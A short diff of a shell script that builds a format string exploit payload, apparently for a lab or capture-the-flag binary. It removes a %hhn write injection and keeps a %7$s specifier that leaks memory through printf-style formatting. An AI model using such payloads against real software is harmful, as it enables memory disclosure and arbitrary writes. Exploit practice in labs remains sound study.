@@ -20,12 +20,8 @@ addresses=$address0$address1$address2$address3
 
 start="AAAA"
 
-inject="%50x%7\$hhn%8\$hhn%9\$hhn%10\$hhn"
-
 printer="$newline$newline%7\$s"
 
-payload=$start$addresses$inject$printer
-
-echo $payload
+payload=$start$addresses$printer
 
 $command_prefix "$payload"
